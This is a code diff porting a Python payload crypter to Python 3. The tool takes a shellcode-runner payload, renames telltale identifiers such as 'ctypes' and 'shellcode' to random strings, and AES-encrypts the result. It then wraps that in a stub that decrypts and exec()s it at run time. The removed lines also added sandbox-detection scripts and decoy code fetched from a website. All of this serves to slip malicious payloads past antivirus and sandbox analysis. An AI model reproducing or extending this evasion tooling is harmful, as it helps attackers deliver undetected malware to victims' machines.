@@ -1,21 +1,24 @@
-import Crypto.Cipher.AES as AES
-import os
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from base64 import b64encode, b64decode
 import random
 import string
 import re
 import blessed
-import lxml.html
 
 t = blessed.Terminal()
 
+
 def randomVar():
     return ''.join(random.sample(string.ascii_lowercase, 8))
+
 
 def randomJunk():
     newString = ''
     for i in range(random.randint(1, 10)):
         newString += ''.join(random.sample(string.ascii_lowercase, random.randint(1, 26)))
     return newString
+
 
 def getSandboxScripts(sandboxLang='python'):
     sandboxScripts = ''
@@ -41,48 +44,38 @@ def getSandboxScripts(sandboxLang='python'):
                 newString = scriptVariable + ' = ' + variableValue
                 sandboxContent = sandboxContent.replace(originalString, newString)
             sandboxScripts += sandboxContent
-    print(sandboxScripts)
     return sandboxScripts
 
 
 def do_Encryption(payload):
-    counter = os.urandom(16)
-    key = os.urandom(32)
+    key = get_random_bytes(16)
+    cipher = AES.new(key, AES.MODE_CTR)
 
-    randkey = randomVar()
-    randcounter = randomVar()
-    randcipher = randomVar()
-
-    randdecrypt = randomJunk()
     randshellcode = randomJunk()
     randbuf = randomJunk()
     randptr = randomJunk()
     randht = randomJunk()
-
     randctypes = randomJunk()
-    randaes = randomJunk()
 
-    try:
-        rawHTML = lxml.html.parse('http://www.4geeks.de/cgi-bin/webgen.py').getroot()
-        randomPython = rawHTML.cssselect('pre')[0].text_content()
-    except Exception as E:
-        print(E)
-        print(t.bold_red + '[!] No network Connection, random python not generated.' + t.normal)
-        randomPython = 'if __name__ == \'__main__\':'
+    payload = payload.replace('ctypes', randctypes)
+    payload = payload.replace('shellcode', randshellcode)
+    payload = payload.replace('bufe', randbuf)
+    payload = payload.replace('ptr', randptr)
+    payload = payload.replace('ht', randht)
 
+    ct_bytes = cipher.encrypt(payload.encode())
+    nonce = b64encode(cipher.nonce).decode('utf-8')
+    ct = b64encode(ct_bytes).decode('utf-8')
 
-    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode).replace('bufe', randbuf).replace('ptr', randptr).replace('ht',randht))
+    injector = "#!/usr/bin/env python3\n"
+    injector += "from Crypto.Cipher import AES\n"
+    injector += "from base64 import b64decode\n"
+    injector += "import ctypes as {}\n".format(randctypes)
+    injector += "key = {}\n".format(key)
+    injector += "ct = b64decode('{}')\n".format(ct)
+    injector += "nonce = b64decode('{}')\n".format(nonce)
+    injector += "cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)\n"
+    injector += "pt = cipher.decrypt(ct)\n"
+    injector += "exec(pt.decode())"
 
-    newpayload = "# -*- coding: utf-8 -*- \n"
-    newpayload += "from Crypto.Cipher import AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
-    newpayload += getSandboxScripts('python')
-    newpayload += randomPython
-    newpayload += "\n\t%s = '%s'\n"% (randomVar(), randomJunk())
-    newpayload += "\t%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
-    newpayload += "\t%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
-    newpayload += "\t%s = '%s'\n"% (randomVar(), randomJunk())
-    newpayload += "\t%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
-    newpayload += "\t%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))
-    newpayload += "\texec(%s)" % randcipher
-    return newpayload
+    return injector
